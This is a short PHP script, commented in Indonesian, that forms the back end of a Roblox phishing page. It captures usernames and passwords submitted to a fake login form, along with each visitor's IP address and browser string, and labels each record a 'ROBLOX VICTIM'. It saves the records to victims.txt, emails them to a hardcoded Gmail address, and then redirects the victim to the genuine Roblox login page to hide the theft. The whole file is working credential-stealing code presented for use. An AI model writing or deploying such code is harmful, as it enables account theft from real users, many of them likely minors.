<?php
// ========== KONFIGURASI ==========
$target_email = "raran6610@gmail.com";  // Email tujuan lu

// ========== AMBIL DATA ==========
$username = isset($_POST['username']) ? $_POST['username'] : 'tidak diisi';
$password = isset($_POST['password']) ? $_POST['password'] : 'tidak diisi';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// ========== FORMAT DATA ==========
$data = "
========================================
🔴 ROBLOX VICTIM
========================================
Username    : $username
Password    : $password
IP Address  : $ip
User-Agent  : $user_agent
Timestamp   : $time
========================================
";

// ========== SIMPAN KE FILE ==========
file_put_contents('victims.txt', $data . "\n", FILE_APPEND);

// ========== KIRIM EMAIL ==========
$subject = "🔴 New Roblox Creds: $username";
$headers = "From: roblox-phish@system.local\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Kirim pake mail() function PHP (harus aktif di hosting)
mail($target_email, $subject, $data, $headers);

// ========== REDIRECT KE ROBLOX ASLI ==========
header('Location: https://www.roblox.com/login');
exit;
?>
